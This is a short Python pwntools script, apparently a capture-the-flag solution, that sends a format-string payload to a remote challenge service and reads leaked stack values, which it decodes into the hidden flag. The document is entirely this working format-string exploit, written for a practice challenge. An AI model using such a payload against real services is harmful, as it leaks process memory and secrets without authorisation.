from pwn import *
from Crypto.Util.number import long_to_bytes

# p = process('./chall')
p = remote('tjc.tf', 31258)

payload = ''.join([f'%{i}$p.' for i in range(20, 25)])
p.sendlineafter(b'> ', payload.encode())
p.recvuntil(b'< ')
flag = p.recvline()[:-2].decode().split('.')
print(b''.join([long_to_bytes(int(c, 16))[::-1] for c in flag]))
